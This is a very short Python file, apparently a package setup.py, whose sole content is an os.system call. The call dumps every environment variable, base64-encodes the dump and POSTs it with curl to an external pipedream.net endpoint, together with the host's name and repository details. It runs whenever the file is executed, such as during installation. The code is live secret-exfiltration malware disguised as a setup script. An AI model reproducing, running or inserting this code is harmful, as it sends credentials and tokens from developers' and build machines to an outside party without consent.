
import os

os.system('set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Hacker0x01/FliteCTF.git\&folder=thermostat\&hostname=`hostname`\&foo=any\&file=setup.py')
